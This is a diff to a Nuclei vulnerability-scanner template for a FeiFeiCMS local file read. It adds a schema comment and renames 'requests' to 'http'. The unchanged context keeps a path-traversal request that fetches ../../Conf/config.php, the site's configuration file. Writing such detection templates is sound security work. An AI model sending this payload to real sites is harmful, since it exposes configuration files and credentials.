@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: feifeicms-lfr
 
 info:
@@ -14,7 +15,7 @@ info:
     cwe-id: CWE-22
   tags: feifeicms,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php"
